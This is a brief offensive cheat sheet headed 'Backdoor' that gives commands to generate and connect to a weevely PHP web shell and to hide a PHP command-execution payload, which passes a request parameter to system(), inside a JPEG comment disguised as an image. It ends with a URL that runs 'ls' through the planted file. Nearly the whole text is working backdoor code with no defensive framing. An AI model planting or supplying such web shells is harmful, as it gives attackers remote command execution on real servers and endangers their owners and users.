# Backdoor

...

```bash
weevely generate 12345 404.php
weevely http://domain.com/404.php 12345

jhead -purejpg ns.jpg
jhead -ce ns.jpg
mv ns.jpg ns.php.jpg

Insert:

<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="foto.jpg" border=0>
';}__halt_compiler();?></h1>

:wq
```

```url
http://domain.com/ns.php.jpg?cmd=ls
```
